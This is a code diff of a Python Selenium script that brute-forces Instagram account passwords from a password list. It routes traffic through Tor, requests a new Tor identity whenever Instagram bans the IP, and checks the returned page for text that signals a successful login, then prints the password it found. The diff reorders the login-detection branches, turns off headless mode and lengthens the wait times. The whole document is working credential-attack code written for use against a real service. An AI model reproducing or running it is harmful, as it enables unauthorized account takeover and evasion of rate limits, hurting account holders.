@@ -70,6 +70,10 @@ def renew_tor_ip():
         controller.authenticate()
         controller.signal(Signal.NEWNYM)
 
+
+count = file_length(str(passlist))
+
+
 ###########  Setting up the driver  ###################
 
 #Assigning TOR proxy
@@ -77,7 +81,7 @@ PROXY =  "socks5://127.0.0.1:9050"
 #Adding the proxy to chrome
 options = webdriver.ChromeOptions()
 options.add_argument('--proxy-server=%s' % PROXY)
-options.add_argument('headless')
+#options.add_argument('headless')
 options.add_argument('--log-level=3')
 #Setting up the chromedriver
 driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
@@ -105,7 +109,7 @@ while True:
         #Adding the proxy to chrome
         options = webdriver.ChromeOptions()
         options.add_argument('--proxy-server=%s' % PROXY)
-        options.add_argument('headless')
+        #options.add_argument('headless')
         options.add_argument('--log-level=3')
         #Setting up the chromedriver
         driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
@@ -158,80 +162,13 @@ while True:
     #Submitting, the password and the username
     submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
     submit.click()
-    time.sleep(1)
+    time.sleep(11)
 
 ######################  Login Detection  ####################
 
-    if "not-logged-in" in driver.page_source:
-        print("\n")
-        print("Wrong Password, no match")
-        time.sleep(5)
-        if "Suspicious Login Attempt" in driver.page_source:
-            print("\n")
-            print("Password Found")
-            print("The password is:", p)
-            sys.exit()
-
-        elif 'There was a problem logging you into Instagram' in driver.page_source:
-            for t in range(2):
-                submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
-                submit.click()
-                time.sleep(3)
-                if "incorrect" in driver.page_source:
-                    print("\n")
-                    print("Wrong password, no match")
-                    print("Trying another password")
-                    break
-                elif "We couldn't connect" in driver.page_source:
-                    a -= 1
-                    b -= 1
-                    print("\n")
-                    print("Instagram has banned this IP")
-                    print("Requesting new one")
-                    time.sleep(10)
-                    renew_tor_ip()
-
-
-                elif "Suspicious Login Attempt" in driver.page_source:
-                    print("\n")
-                    print("Password Found")
-                    print("The password is:", p)
-                    sys.exit()
-
-                elif 'class="no-js logged-in' in driver.page_source:
-                    print("\n")
-                    print("Password Found")
-                    print("The password is:", p)
-                    sys.exit()
-
-                elif "The username you entered doesn't belong to an account." in driver.page_source:
-                    print("\n")
-                    print("WRONG USERNAME")
-                    print("Check the username, and run the script again")
-                    sys.exit()
-
-                else:
-                    continue
-            if 'There was a problem logging you into Instagram' in driver.page_source:
-                a -= 1
-                b -= 1
-                renew_tor_ip()
-
-            elif "The username you entered doesn't belong to an account." in driver.page_source:
-                print("\n")
-                print("WRONG USERNAME")
-                print("Check the username, and run the script again")
-                sys.exit()
-
-        elif "We couldn't connect" in driver.page_source:
-            a -= 1
-            b -= 1
-            print("\n")
-            print("Instagram has banned this IP")
-            print("Requesting new one")
-            time.sleep(10)
-            renew_tor_ip()
-
+    if "incorrect" in driver.page_source:
+        print("Wrong password, no match")
+        time.sleep(1)
 
     elif "Suspicious Login Attempt" in driver.page_source:
         print("\n")
@@ -239,14 +176,74 @@ while True:
         print("The password is:", p)
         sys.exit()
 
-    elif "The username you entered doesn't belong to an account." in driver.page_source:
-        print("\n")
-        print("WRONG USERNAME")
-        print("Check the username, and run the script again")
-        sys.exit()
-
-    else:
+    elif 'class="no-js logged-in' in driver.page_source:
         print("\n")
         print("Password Found")
         print("The password is:", p)
         sys.exit()
+
+    elif "We couldn't connect" in driver.page_source:
+        a -= 1
+        b -= 1
+        print("\n")
+        print("Instagram has banned this IP")
+        print("Requesting new one")
+        time.sleep(10)
+        renew_tor_ip()
+
+    elif 'There was a problem logging you into Instagram' in driver.page_source:
+        for t in range(2):
+            submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
+            submit.click()
+            time.sleep(3)
+            if "incorrect" in driver.page_source:
+                print("\n")
+                print("Wrong password, no match")
+                print("Trying another password")
+                break
+            elif "We couldn't connect" in driver.page_source:
+                a -= 1
+                b -= 1
+                print("\n")
+                print("Instagram has banned this IP")
+                print("Requesting new one")
+                time.sleep(10)
+                renew_tor_ip()
+
+
+            elif "Suspicious Login Attempt" in driver.page_source:
+                print("\n")
+                print("Password Found")
+                print("The password is:", p)
+                sys.exit()
+
+            elif 'class="no-js logged-in' in driver.page_source:
+                print("\n")
+                print("Password Found")
+                print("The password is:", p)
+                sys.exit()
+
+            elif "The username you entered doesn't belong to an account." in driver.page_source:
+                print("\n")
+                print("WRONG USERNAME")
+                print("Check the username, and run the script again")
+                sys.exit()
+
+            else:
+                continue
+        if 'There was a problem logging you into Instagram' in driver.page_source:
+            a -= 1
+            b -= 1
+            renew_tor_ip()
+
+        elif "The username you entered doesn't belong to an account." in driver.page_source:
+            print("\n")
+            print("WRONG USERNAME")
+            print("Check the username, and run the script again")
+            sys.exit()
+
+        elif 'class="no-js logged-in' in driver.page_source:
+            print("\n")
+            print("Password Found")
+            print("The password is:", p)
+            sys.exit()
